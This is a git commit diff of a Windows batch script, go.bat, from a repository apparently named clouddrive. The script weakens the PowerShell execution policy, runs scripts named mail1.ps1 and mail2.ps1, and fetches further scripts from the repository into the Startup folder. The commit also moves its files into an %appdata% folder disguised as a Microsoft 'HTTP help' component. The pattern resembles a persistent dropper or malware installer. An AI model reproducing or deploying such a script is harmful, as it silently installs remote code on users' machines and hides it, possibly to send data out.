4a7170501615ac6d2a178eabff0f078945c5cdfc
Quentinq32 <100795382+Quentinq32@users.noreply.github.com>
2022-07-08 15:27:02 +0200

    Add files via upload

--- go.bat
+++ go.bat
@@ -7,15 +7,15 @@ powershell Set-ExecutionPolicy RemoteSigned
 cls
 powershell Get-ExecutionPolicy
 cls
-powershell c:/script\mail2.ps1
-powershell c:/script\mail1.ps1
+powershell %appdata%\microsoft\HTTP help\mail2.ps1
+powershell %appdata%\microsoft\HTTP help\mail1.ps1
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 cls
-WScript C:\script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/menu.vbs
-cd c:/script/
-WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail1.ps1
-WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail2.ps1
-WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/download.vbs
-WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/start.bat
-WScript c:/script\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/go.bat
+WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/menu.vbs
+cd %appdata%\microsoft\HTTP help\
+WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail1.ps1
+WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail2.ps1
+WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/download.vbs
+WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/start.bat
+WScript %appdata%\microsoft\HTTP help\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/go.bat
 @echo off
